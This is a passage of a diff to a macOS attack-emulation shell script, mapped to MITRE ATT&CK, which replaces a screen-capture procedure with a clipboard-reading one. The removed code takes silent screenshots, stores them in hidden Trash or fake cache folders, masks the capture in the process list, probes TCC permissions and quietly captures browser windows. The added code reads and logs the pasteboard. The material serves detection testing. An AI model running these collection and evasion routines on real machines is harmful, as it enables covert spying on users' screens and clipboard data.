@@ -1,14 +1,14 @@
 #!/bin/sh
 # POSIX-compliant
-# Procedure Name: screen_capture
+# Procedure Name: pbpaste
 # Tactic: Collection
-# Technique: T1113
-# GUID: 629c194e-c952-4cbc-bfa6-9c224b31d118
-# Intent: Capture screenshots of the desktop for reconnaissance and data collection
-# Author: @darmado | https://x.com/darmad0
-# created: 2025-05-28
+# Technique: T1115
+# GUID: a2aaedc3-ffdf-4918-b0bd-8d147fc39634
+# Intent: Read the macOS general pasteboard (pbpaste) for clipboard collection emulation. Default monitor is foreground, bounded, and second-granular for triage and detection engineering—not a silent background loop.
+# Author: Brendan Chamberlain (@infosecB)
+# created: 2023-04-11
 # Updated: 2026-05-03
-# Version: 1.0.9
+# Version: 1.1.5
 # License: Apache 2.0
 
 # Core function Info:
@@ -20,7 +20,7 @@
 NAME="" 
 # MITRE ATT&CK Mappings
 TACTIC="Collection" #replace with you coresponding tactic
-TTP_ID="T1113" #replace with you coresponding ttp_id
+TTP_ID="T1115" #replace with you coresponding ttp_id
 
 TACTIC_ENCRYPT="Defense Evasion" # DO NOT MODIFY
 TTP_ID_ENCRYPT="T1027" # DO NOT MODIFY
@@ -92,32 +92,22 @@ CMD_WC="wc"
 CMD_CAT="cat"
 CMD_LSOF="lsof"
 
-SCREENSHOT=false
-DISPLAY=false
-LIST_WINDOWS=false
-WINDOW_ID=false
-BROWSER_WINDOWS=false
-APP_WINDOWS=false
-HIDDEN=false
-MASQUERADE=false
-CACHE=false
-OSASCRIPT=false
-SWIFT=false
-PYTHON=false
-TCC_QUERY=false
-PROCESS_SCAN=false
-TCC_PROXY=false
-ALL_METHODS=false
+ONCE=false
+MONITOR=false
+INPUT_INTERVAL=""
+INPUT_COUNT=""
+INPUT_PATH=""
 
-SCREENSHOT_PATH="/tmp/ss.jpg"
-HIDDEN_DIR="$HOME/.Trash/.ss"
-CACHE_DIR="$HOME/Library/Caches/com.apple.screencapture"
+CMD_PBPASTE="/usr/bin/pbpaste"
+INPUT_PATH=""
+INPUT_INTERVAL=10
+INPUT_COUNT=10
 
 # Project root path (set by build system)
 PROJECT_ROOT="/Users/darmado/Desktop/attack-macOS"  # Set by build system to project root directory
 
 # Procedure Information (set by build system)
-PROCEDURE_NAME="screen_capture"  # Set by build system from YAML procedure_name field
+PROCEDURE_NAME="pbpaste"  # Set by build system from YAML procedure_name field
 
 # Function execution tracking
 FUNCTION_LANG=""  # Ued by log_output at execution time
@@ -659,54 +649,42 @@ core_parse_args() {
                 SACRIFICIAL_CHILD=true
                 ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
-        --screenshot)
-            SCREENSHOT=true
+        --once)
+            ONCE=true
             ;;
-        --display)
-            DISPLAY=true
+        --monitor)
+            MONITOR=true
             ;;
-        --list-windows)
-            LIST_WINDOWS=true
-            ;;
-        --window-id)
-            WINDOW_ID=true
-            ;;
-        --browser-windows)
-            BROWSER_WINDOWS=true
-            ;;
-        --app-windows)
-            APP_WINDOWS=true
-            ;;
-        --hidden)
-            HIDDEN=true
-            ;;
-        --masquerade)
-            MASQUERADE=true
-            ;;
-        --cache)
-            CACHE=true
-            ;;
-        --osascript)
-            OSASCRIPT=true
-            ;;
-        --swift)
-            SWIFT=true
-            ;;
-        --python)
-            PYTHON=true
-            ;;
-        --tcc-query)
-            TCC_QUERY=true
-            ;;
-        --process-scan)
-            PROCESS_SCAN=true
-            ;;
-        --tcc-proxy)
-            TCC_PROXY=true
-            ;;
-        --all-methods)
-            ALL_METHODS=true
-            ;;
+        --interval)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_INTERVAL="$2"
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --count)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_COUNT="$2"
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+        --path)
+            if [ -n "$2" ] && [ "$2" != "${2#-}" ]; then
+                MISSING_VALUES="$MISSING_VALUES $1"
+            elif [ -n "$2" ]; then
+                INPUT_PATH="$2"
+                    shift
+            else
+                MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
             *)
                 # Collect unknown arguments for error reporting
                 if [ -z "$UNKNOWN_ARGS" ]; then
@@ -745,22 +723,11 @@ HELP:
   -d, --debug                   Enable debug output (includes verbose output)
 
 SCRIPT:
-  --screenshot                     Capture a silent screenshot
-  --display                        Capture screenshot and display info
-  --list-windows                   List available windows for targeted screenshot capture
-  --window-id                      Capture screenshot of specific window by ID
-  --browser-windows                Capture screenshots of all browser windows
-  --app-windows                    Capture screenshots of all application windows
-  --hidden                         Capture screenshot with hidden storage in .Trash
-  --masquerade                     Capture screenshot using process name masquerading
-  --cache                          Capture screenshot stored in realistic cache directory
-  --osascript                      Capture screenshot using osascript/AppleScript interpreter
-  --swift                          Capture screenshot using Swift system commands
-  --python                         Capture screenshot using Python system commands
-  --tcc-query                      Query TCC database for screen recording permissions
-  --process-scan                   Scan for processes that might have screen recording permissions
-  --tcc-proxy                      Find and use apps with existing screen recording permissions
-  --all-methods                    Test ALL screenshot capture methods for maximum detection coverage
+  --once                           Read pasteboard once; one timestamped stdout line
+  --monitor                        Foreground loop (defaults --interval 10 --count 10; PID is this shell)
+  --interval NUMBER                Seconds between pasteboard reads (same meaning as clipboard_monitoring)
+  --count NUMBER                   Pasteboard reads before exit (iterations, not duration)
+  --path ENABLE|DISABLE            Optional append-only file (timestamp, tab, paste text)
 
 EXECUTION:
   --sacrificial-pid             Run main logic in a child shell; parent reads child stdout from a FIFO under
@@ -2145,6 +2112,9 @@ raw_output=""
 # Set global function language for this procedure
 FUNCTION_LANG="shell"
 
+# Process input arguments
+process_input_arguments
+
 # Helper function to execute procedure functions
 execute_function() {
     local func_name="$1"
@@ -2152,138 +2122,37 @@ execute_function() {
     $func_name
 }
 
-# Execute functions for --screenshot
-if [ "$SCREENSHOT" = true ]; then
-    core_debug_print "Executing functions for --screenshot"
-    result=$(execute_function capture_screenshot)
+# Execute functions for --once
+if [ "$ONCE" = true ]; then
+    core_debug_print "Executing functions for --once"
+    result=$(execute_function collect_clipboard_once)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --display
-if [ "$DISPLAY" = true ]; then
-    core_debug_print "Executing functions for --display"
-    result=$(execute_function capture_screenshot_with_info)
+# Execute functions for --monitor
+if [ "$MONITOR" = true ]; then
+    core_debug_print "Executing functions for --monitor"
+    result=$(execute_function collect_clipboard_monitor)
     raw_output="${raw_output}${result}"
 fi
 
-# Execute functions for --list-windows
-if [ "$LIST_WINDOWS" = true ]; then
-    core_debug_print "Executing functions for --list-windows"
-    result=$(execute_function list_available_windows)
-    raw_output="${raw_output}${result}"
+# Execute functions for --interval
+if [ "$INTERVAL" = true ]; then
+    core_debug_print "Executing functions for --interval"
 fi
 
-# Execute functions for --window-id
-if [ "$WINDOW_ID" = true ]; then
-    core_debug_print "Executing functions for --window-id"
-    result=$(execute_function capture_window_screenshot)
-    raw_output="${raw_output}${result}"
+# Execute functions for --count
+if [ "$COUNT" = true ]; then
+    core_debug_print "Executing functions for --count"
 fi
 
-# Execute functions for --browser-windows
-if [ "$BROWSER_WINDOWS" = true ]; then
-    core_debug_print "Executing functions for --browser-windows"
-    result=$(execute_function capture_browser_windows)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --app-windows
-if [ "$APP_WINDOWS" = true ]; then
-    core_debug_print "Executing functions for --app-windows"
-    result=$(execute_function capture_app_windows)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --hidden
-if [ "$HIDDEN" = true ]; then
-    core_debug_print "Executing functions for --hidden"
-    result=$(execute_function capture_hidden_screenshot)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --masquerade
-if [ "$MASQUERADE" = true ]; then
-    core_debug_print "Executing functions for --masquerade"
-    result=$(execute_function capture_masquerade_screenshot)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --cache
-if [ "$CACHE" = true ]; then
-    core_debug_print "Executing functions for --cache"
-    result=$(execute_function capture_cache_screenshot)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --osascript
-if [ "$OSASCRIPT" = true ]; then
-    core_debug_print "Executing functions for --osascript"
-    result=$(execute_function capture_osascript_screenshot)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --swift
-if [ "$SWIFT" = true ]; then
-    core_debug_print "Executing functions for --swift"
-    result=$(execute_function capture_swift_screenshot)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --python
-if [ "$PYTHON" = true ]; then
-    core_debug_print "Executing functions for --python"
-    result=$(execute_function capture_python_screenshot)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --tcc-query
-if [ "$TCC_QUERY" = true ]; then
-    core_debug_print "Executing functions for --tcc-query"
-    result=$(execute_function query_tcc_permissions)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --process-scan
-if [ "$PROCESS_SCAN" = true ]; then
-    core_debug_print "Executing functions for --process-scan"
-    result=$(execute_function scan_privileged_processes)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --tcc-proxy
-if [ "$TCC_PROXY" = true ]; then
-    core_debug_print "Executing functions for --tcc-proxy"
-    result=$(execute_function capture_tcc_proxy_screenshot)
-    raw_output="${raw_output}${result}"
-fi
-
-# Execute functions for --all-methods
-if [ "$ALL_METHODS" = true ]; then
-    core_debug_print "Executing functions for --all-methods"
-    result=$(execute_function capture_screenshot)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function capture_hidden_screenshot)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function capture_masquerade_screenshot)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function capture_cache_screenshot)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function capture_osascript_screenshot)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function capture_swift_screenshot)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function capture_python_screenshot)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function query_tcc_permissions)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function scan_privileged_processes)
-    raw_output="${raw_output}${result}"
-    result=$(execute_function capture_tcc_proxy_screenshot)
-    raw_output="${raw_output}${result}"
+# Execute functions for --path
+if [ "$PATH" = true ]; then
+    core_debug_print "Executing functions for --path"
 fi
 
 # Set procedure name for processing
-procedure="screen_capture"
+procedure="pbpaste"
         # This section is intentionally left empty as it will be filled by
         # technique-specific implementations when sourcing this base script
         # If no raw_output is set by the script, exit gracefully
@@ -2446,557 +2315,89 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
-
-
-# Function: capture_screenshot
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_screenshot() {
-    printf "SCREENSHOT|capturing|Silent screenshot\n"
+# Input processing and type conversion
+process_input_arguments() {
+    # Process and validate input arguments based on their types
     
-    # Capture screenshot silently (no sound, no UI)
-    screencapture -x "$SCREENSHOT_PATH"
-    
-    if [ -f "$SCREENSHOT_PATH" ]; then
-        file_size=$(stat -f%z "$SCREENSHOT_PATH")
-        printf "SCREENSHOT|captured|%s (%s bytes)\n" "$SCREENSHOT_PATH" "$file_size"
-    else
-        printf "SCREENSHOT|failed|Could not capture screenshot\n"
-    fi
-}
-
-
-# Function: capture_screenshot_with_info
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_screenshot_with_info() {
-    printf "SCREENSHOT|capturing|Screenshot with display info\n"
-    
-    # Get display information first
-    display_count=$(system_profiler SPDisplaysDataType)
-    printf "SCREENSHOT|displays|%s\n" "$display_count"
-    
-    # Capture screenshot
-    screencapture -x "$SCREENSHOT_PATH"
-    
-    if [ -f "$SCREENSHOT_PATH" ]; then
-        file_size=$(stat -f%z "$SCREENSHOT_PATH")
-        printf "SCREENSHOT|captured|%s (%s bytes)\n" "$SCREENSHOT_PATH" "$file_size"
-        
-        # Get image dimensions
-        image_info=$(file "$SCREENSHOT_PATH")
-        printf "SCREENSHOT|info|%s\n" "$image_info"
-    else
-        printf "SCREENSHOT|failed|Could not capture screenshot\n"
-    fi
-}
-
-
-# Function: capture_hidden_screenshot
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_hidden_screenshot() {
-    # Create hidden directory in .Trash
-    mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
-    local output_path="$HOME/.Trash/.ss/$(date +%Y%m%d_%H%M%S).jpg"
-    
-    printf "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\n"
-    
-    # Direct screencapture to hidden location
-    screencapture -x "$output_path" 2>/dev/null
-    
-    if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
-    else
-        printf "HIDDEN_SCREENSHOT|failed|capture failed\n"
-        return 1
-    fi
-}
-
-
-# Function: capture_masquerade_screenshot
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_masquerade_screenshot() {
-    # Create hidden directory with random name
-    local random_dir="$HOME/.Trash/.$(openssl rand -hex 4)"
-    mkdir -p "$random_dir" 2>/dev/null
-    local output_path="$random_dir/temp_$(date +%s).jpg"
-    
-    printf "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\n"
-    
-    # Create a temporary script that runs screencapture
-    local temp_script="/tmp/capture_$(openssl rand -hex 4).sh"
-    echo "#!/bin/sh" > "$temp_script"
-    echo "screencapture -x '$output_path'" >> "$temp_script"
-    chmod +x "$temp_script"
-    
-    # Execute via temporary script (hides screencapture in process list)
-    "$temp_script" 2>/dev/null
-    rm -f "$temp_script" 2>/dev/null
-    
-    if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
-    else
-        printf "MASQUERADE_SCREENSHOT|failed|capture failed\n"
-        return 1
-    fi
-}
-
-
-# Function: capture_cache_screenshot
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_cache_screenshot() {
-    # Create realistic cache directory
-    mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
-    local output_path="$HOME/Library/Caches/com.apple.screencapture/capture_$(date +%s).jpg"
-    
-    printf "CACHE_SCREENSHOT|capturing|Using realistic cache directory\n"
-    
-    # Direct screencapture to cache location
-    screencapture -x "$output_path" 2>/dev/null
-    
-    if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "CACHE_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
-    else
-        printf "CACHE_SCREENSHOT|failed|capture failed\n"
-        return 1
-    fi
-}
-
-
-# Function: capture_osascript_screenshot
-# Type: main
-# Languages: applescript
-FUNCTION_LANG="applescript"
-# Sudo privileges: Not required
-
-capture_osascript_screenshot() {
-    # Create hidden directory in .Trash
-    mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
-    local output_path="$HOME/.Trash/.ss/osascript_$(date +%Y%m%d_%H%M%S).jpg"
-    
-    printf "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\n"
-    
-    # Use osascript to execute screencapture (may prompt for automation permissions)
-    osascript -e "tell application \"System Events\" to do shell script \"screencapture -x '$output_path'\"" 2>/dev/null
-    
-    if [ -f "$output_path" ]; then
-        file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
-    else
-        printf "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\n"
-        return 1
-    fi
-}
-
-
-# Function: capture_swift_screenshot
-# Type: main
-# Languages: swift
-FUNCTION_LANG="swift"
-# Sudo privileges: Not required
-
-capture_swift_screenshot() {
-    mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
-    local output_path="$HOME/Library/Caches/com.apple.screencapture/swift_$(date +%s).jpg"
-    
-    printf "SWIFT_SCREENSHOT|capturing|Using Swift Process class (standard library)\\n"
-    
-    # Create temporary Swift script (no external dependencies)
-    local swift_script="/tmp/screenshot_$(openssl rand -hex 4).swift"
-    echo 'import Foundation' > "$swift_script"
-    echo 'let outputPath = CommandLine.arguments[1]' >> "$swift_script"
-    echo 'let process = Process()' >> "$swift_script"
-    echo 'process.launchPath = "/usr/sbin/screencapture"' >> "$swift_script"
-    echo 'process.arguments = ["-x", outputPath]' >> "$swift_script"
-    echo 'process.launch()' >> "$swift_script"
-    echo 'process.waitUntilExit()' >> "$swift_script"
-    echo 'if process.terminationStatus == 0 {' >> "$swift_script"
-    echo '    let fileManager = FileManager.default' >> "$swift_script"
-    echo '    if fileManager.fileExists(atPath: outputPath) {' >> "$swift_script"
-    echo '        if let attributes = try? fileManager.attributesOfItem(atPath: outputPath),' >> "$swift_script"
-    echo '           let fileSize = attributes[FileAttributeKey.size] as? Int64 {' >> "$swift_script"
-    echo '            print("SUCCESS: \\(outputPath) (\\(fileSize) bytes)")' >> "$swift_script"
-    echo '        }' >> "$swift_script"
-    echo '    } else { exit(1) }' >> "$swift_script"
-    echo '} else { exit(1) }' >> "$swift_script"
-    
-    local result=$(swift "$swift_script" "$output_path" 2>/dev/null)
-    rm -f "$swift_script"
-    
-    if echo "$result" | grep -q "SUCCESS:"; then
-        printf "SWIFT_SCREENSHOT|captured|%s\\n" "$result"
-    else
-        printf "SWIFT_SCREENSHOT|failed|capture failed\\n"
-        return 1
-    fi
-}
-
-
-# Function: capture_python_screenshot
-# Type: main
-# Languages: python
-FUNCTION_LANG="python"
-# Sudo privileges: Not required
-
-capture_python_screenshot() {
-    mkdir -p "$HOME/.local/share" 2>/dev/null
-    local output_path="$HOME/.local/share/python_$(openssl rand -hex 4).jpg"
-    
-    printf "PYTHON_SCREENSHOT|capturing|Using Python subprocess (standard library)\\n"
-    
-    # Create temporary Python script (no external dependencies)
-    local python_script="/tmp/screenshot_$(openssl rand -hex 4).py"
-    echo 'import subprocess' > "$python_script"
-    echo 'import sys' >> "$python_script"
-    echo 'import os' >> "$python_script"
-    echo 'output_path = sys.argv[1]' >> "$python_script"
-    echo 'try:' >> "$python_script"
-    echo '    result = subprocess.run(["/usr/sbin/screencapture", "-x", output_path], capture_output=True, text=True, timeout=10)' >> "$python_script"
-    echo '    if result.returncode == 0 and os.path.exists(output_path):' >> "$python_script"
-    echo '        size = os.path.getsize(output_path)' >> "$python_script"
-    echo '        print(f"SUCCESS: {output_path} ({size} bytes)")' >> "$python_script"
-    echo '    else:' >> "$python_script"
-    echo '        sys.exit(1)' >> "$python_script"
-    echo 'except Exception:' >> "$python_script"
-    echo '    sys.exit(1)' >> "$python_script"
-    
-    local result=$(python3 "$python_script" "$output_path" 2>/dev/null)
-    rm -f "$python_script"
-    
-    if echo "$result" | grep -q "SUCCESS:"; then
-        printf "PYTHON_SCREENSHOT|captured|%s\\n" "$result"
-    else
-        printf "PYTHON_SCREENSHOT|failed|capture failed\\n"
-        return 1
-    fi
-}
-
-
-# Function: query_tcc_permissions
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-query_tcc_permissions() {
-    printf "TCC_QUERY|checking|Screen recording permissions in TCC database\\n"
-    
-    local user_tcc="$HOME/Library/Application Support/com.apple.TCC/TCC.db"
-    local system_tcc="/Library/Application Support/com.apple.TCC/TCC.db"
-    
-    # Check TCC database accessibility
-    if [ -r "$user_tcc" ]; then
-        printf "TCC_QUERY|user_db|Accessible for reading\\n"
-        
-        # Query for screen capture services
-        local screen_services=$(sqlite3 "$user_tcc" "SELECT DISTINCT service FROM access WHERE service LIKE '%Screen%' OR service LIKE '%kTCC%';" 2>/dev/null)
-        if [ -n "$screen_services" ]; then
-            printf "TCC_QUERY|services|%s\\n" "$screen_services"
-            
-            # Get specific permissions
-            sqlite3 "$user_tcc" "SELECT service, client, auth_value FROM access WHERE service LIKE '%Screen%';" 2>/dev/null | while IFS='|' read -r service client allowed; do
-                [ -n "$service" ] && printf "TCC_QUERY|permission|%s: %s (auth_value: %s)\\n" "$service" "$client" "$allowed"
-            done
-        else
-            printf "TCC_QUERY|services|No screen-related services found\\n"
+    # Process --interval argument
+    if [ -n "${INPUT_INTERVAL}" ]; then
+        # Validate integer input
+        if ! echo "${INPUT_INTERVAL}" | grep -qE '^[0-9]+$'; then
+            echo "Error: --interval requires a valid integer, got: ${INPUT_INTERVAL}" >&2
+            exit 1
         fi
-    else
-        printf "TCC_QUERY|user_db|Protected (normal behavior)\\n"
+        INTERVAL_ARG="${INPUT_INTERVAL}"
     fi
     
-    # Check system TCC database
-    if [ -r "$system_tcc" ]; then
-        printf "TCC_QUERY|system_db|Accessible (unusual - may indicate compromise)\\n"
-    else
-        printf "TCC_QUERY|system_db|Protected (normal)\\n"
-    fi
-}
-
-
-# Function: scan_privileged_processes
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-scan_privileged_processes() {
-    printf "PROCESS_SCAN|scanning|Processes that might have screen recording permissions\\n"
-    
-    # Screen Time processes (system level)
-    local screen_time_pids=$(pgrep -f "ScreenTime" 2>/dev/null)
-    if [ -n "$screen_time_pids" ]; then
-        printf "PROCESS_SCAN|found|ScreenTime processes: %s\\n" "$screen_time_pids"
-    fi
-    
-    # Look for apps with screen recording capabilities
-    local recording_apps="QuickTime|Screenshot|OBS|Zoom|Teams|Skype|Discord"
-    ps aux | grep -iE "$recording_apps" | grep -v grep | while IFS= read -r process; do
-        local app_name=$(echo "$process" | awk '{print $11}' | xargs basename)
-        local pid=$(echo "$process" | awk '{print $2}')
-        printf "PROCESS_SCAN|potential|%s (PID: %s)\\n" "$app_name" "$pid"
-    done
-    
-    # Check for loginwindow (system process with broad permissions)
-    local loginwindow_pid=$(pgrep loginwindow | head -1)
-    if [ -n "$loginwindow_pid" ]; then
-        printf "PROCESS_SCAN|system|loginwindow (PID: %s) - system process with elevated permissions\\n" "$loginwindow_pid"
-    fi
-}
-
-
-# Function: capture_tcc_proxy_screenshot
-# Type: main
-# Languages: applescript
-FUNCTION_LANG="applescript"
-# Sudo privileges: Not required
-
-capture_tcc_proxy_screenshot() {
-    mkdir -p "$HOME/.Trash/.ss/proxy" 2>/dev/null
-    local output_path="$HOME/.Trash/.ss/proxy/tcc_proxy_$(date +%s).jpg"
-    
-    printf "TCC_PROXY|attempting|Using apps with existing permissions\\n"
-    
-    # Try QuickTime Player if available
-    if [ -d "/Applications/QuickTime Player.app" ]; then
-        printf "TCC_PROXY|trying|QuickTime Player\\n"
-        
-        # Attempt to use QuickTime's potential permissions
-        osascript -e 'tell application "QuickTime Player"' -e 'do shell script "screencapture -x '"$output_path"'"' -e 'end tell' 2>/dev/null
-        
-        if [ -f "$output_path" ]; then
-            file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-            printf "TCC_PROXY|success|QuickTime proxy: %s (%s bytes)\\n" "$output_path" "$file_size"
-            return 0
+    # Process --count argument
+    if [ -n "${INPUT_COUNT}" ]; then
+        # Validate integer input
+        if ! echo "${INPUT_COUNT}" | grep -qE '^[0-9]+$'; then
+            echo "Error: --count requires a valid integer, got: ${INPUT_COUNT}" >&2
+            exit 1
         fi
+        COUNT_ARG="${INPUT_COUNT}"
     fi
     
-    # Try Screen Time app if running
-    local screen_time_pid=$(pgrep -f "Screen Time" | head -1)
-    if [ -n "$screen_time_pid" ]; then
-        printf "TCC_PROXY|trying|Screen Time process (PID: %s)\\n" "$screen_time_pid"
-        # This would require more advanced techniques like process injection
-        printf "TCC_PROXY|note|Would require process injection techniques\\n"
-    fi
-    
-    printf "TCC_PROXY|failed|No accessible proxy apps found\\n"
-    return 1
-}
-
-
-# Function: list_available_windows
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-list_available_windows() {
-    printf "WINDOW_LIST|enumerating|Available windows for capture\\n"
-    
-    # List windows with IDs using screencapture
-    screencapture -l 2>/dev/null | while IFS= read -r line; do
-        if echo "$line" | grep -q "^[[:space:]]*[0-9]"; then
-            window_id=$(echo "$line" | awk '{print $1}')
-            window_name=$(echo "$line" | cut -d' ' -f2-)
-            printf "WINDOW_LIST|found|ID:%s Name:%s\\n" "$window_id" "$window_name"
-        fi
-    done
-    
-    # Also list running applications
-    printf "WINDOW_LIST|apps|Running applications:\\n"
-    osascript -e 'tell application "System Events" to get name of every application process whose visible is true' 2>/dev/null | tr ',' '\n' | while IFS= read -r app; do
-        clean_app=$(echo "$app" | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
-        printf "WINDOW_LIST|app|%s\\n" "$clean_app"
-    done
-}
-
-
-# Function: capture_window_screenshot
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_window_screenshot() {
-    mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
-    local output_path="$HOME/.Trash/.ss/window_$(date +%Y%m%d_%H%M%S).jpg"
-    
-    printf "WINDOW_SCREENSHOT|capturing|Capturing specific window\\n"
-    
-    # Get the first available window ID if none specified
-    local window_id=$(screencapture -l 2>/dev/null | grep "^[[:space:]]*[0-9]" | head -1 | awk '{print $1}')
-    
-    if [ -n "$window_id" ]; then
-        # Capture specific window
-        screencapture -x -l "$window_id" "$output_path" 2>/dev/null
-        
-        if [ -f "$output_path" ]; then
-            file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-            printf "WINDOW_SCREENSHOT|captured|Window ID %s: %s (%s bytes)\\n" "$window_id" "$output_path" "$file_size"
-        else
-            printf "WINDOW_SCREENSHOT|failed|Could not capture window %s\\n" "$window_id"
-            return 1
-        fi
-    else
-        printf "WINDOW_SCREENSHOT|failed|No windows available for capture\\n"
-        return 1
+    # Process --path argument
+    if [ -n "${INPUT_PATH}" ]; then
+        # Process string input
+        PATH_ARG="${INPUT_PATH}"
     fi
 }
 
 
-# Function: capture_browser_windows
+# Function: collect_clipboard_once
 # Type: main
 # Languages: shell
 FUNCTION_LANG="shell"
 # Sudo privileges: Not required
 
-capture_browser_windows() {
-    mkdir -p "$HOME/.Trash/.ss/browsers" 2>/dev/null
-    local captured_count=0
-    
-    printf "BROWSER_SCREENSHOT|capturing|All browser windows (stealth mode)\\n"
-    
-    # Get all windows and filter for browser windows without activating them
-    screencapture -l 2>/dev/null | while IFS= read -r line; do
-        if echo "$line" | grep -q "^[[:space:]]*[0-9]"; then
-            window_id=$(echo "$line" | awk '{print $1}')
-            window_name=$(echo "$line" | cut -d' ' -f2-)
-            
-            # Check if window belongs to a browser (case insensitive)
-            if echo "$window_name" | grep -iq -E "(safari|chrome|firefox|edge|brave|opera)"; then
-                browser_name=$(echo "$window_name" | sed -E 's/.*[[:space:]]([[:alpha:]]+)[[:space:]].*/\1/' | tr '[:upper:]' '[:lower:]')
-                local output_path="$HOME/.Trash/.ss/browsers/${browser_name}_window_${window_id}_$(date +%s).jpg"
-                
-                # Capture specific browser window without activating it
-                screencapture -x -l "$window_id" "$output_path" 2>/dev/null
-                
-                if [ -f "$output_path" ]; then
-                    file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-                    printf "BROWSER_SCREENSHOT|captured|Window %s (%s): %s (%s bytes)\\n" "$window_id" "$window_name" "$output_path" "$file_size"
-                    captured_count=$((captured_count + 1))
-                fi
-            fi
-        fi
-    done
-    
-    if [ "$captured_count" -eq 0 ]; then
-        printf "BROWSER_SCREENSHOT|failed|No browser windows found\\n"
-        return 1
-    else
-        printf "BROWSER_SCREENSHOT|summary|Captured %d browser windows (stealth)\\n" "$captured_count"
+collect_clipboard_once() {
+    _p_ts=$("$CMD_DATE" '+%Y-%m-%dT%H:%M:%S%z' 2>/dev/null) || _p_ts=$("$CMD_DATE" '+%Y-%m-%d %H:%M:%S')
+    _p_line=$("$CMD_PBPASTE" 2>&1) || true
+    _p_bytes=$(printf '%s' "$_p_line" | "$CMD_WC" -c | "$CMD_TR" -d ' ')
+    $CMD_PRINTF "PBPASTE|mode|once|ts|%s|bytes|%s|text|%s\n" "$_p_ts" "$_p_bytes" "$_p_line"
+    if [ -n "$INPUT_PATH" ]; then
+        $CMD_PRINTF "%s\t%s\n" "$_p_ts" "$_p_line" >> "$INPUT_PATH" || $CMD_PRINTF "ERROR|pbpaste|cannot_append|%s\n" "$INPUT_PATH"
     fi
-}
-
-
-# Function: capture_app_windows
-# Type: main
-# Languages: shell
-FUNCTION_LANG="shell"
-# Sudo privileges: Not required
-
-capture_app_windows() {
-    mkdir -p "$HOME/.Trash/.ss/apps" 2>/dev/null
-    local captured_count=0
-    
-    printf "APP_SCREENSHOT|capturing|All application windows\\n"
-    
-    # Get list of all window IDs and capture each
-    screencapture -l 2>/dev/null | grep "^[[:space:]]*[0-9]" | while IFS= read -r line; do
-        window_id=$(echo "$line" | awk '{print $1}')
-        window_name=$(echo "$line" | cut -d' ' -f2- | tr ' /' '_')
-        
-        if [ -n "$window_id" ] && [ "$window_id" != "0" ]; then
-            local output_path="$HOME/.Trash/.ss/apps/app_${window_id}_$(date +%s).jpg"
-            
